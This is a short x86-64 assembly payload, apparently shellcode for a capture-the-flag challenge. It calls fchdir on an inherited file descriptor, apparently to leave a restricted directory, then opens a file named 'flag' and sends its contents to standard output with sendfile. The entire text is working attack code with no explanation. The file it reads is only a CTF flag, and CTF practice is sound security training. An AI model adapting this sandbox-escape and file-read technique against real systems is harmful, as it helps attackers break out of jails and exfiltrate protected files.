mov rdi, 0x3
mov rax, 0x51
syscall ; Syscall

xor rax, rax
mov eax, 0x67616c66
push rax
push rsp

xor rsi, rsi 
mov rdi, [RSP + 0] 
mov rax, 0x2
syscall ; Syscall
add RSP, 16

mov r10, 0x28
xor rdx, rdx 
mov rsi, 0x4
mov rdi, 0x1
mov rax, 0x28
syscall ; Syscall

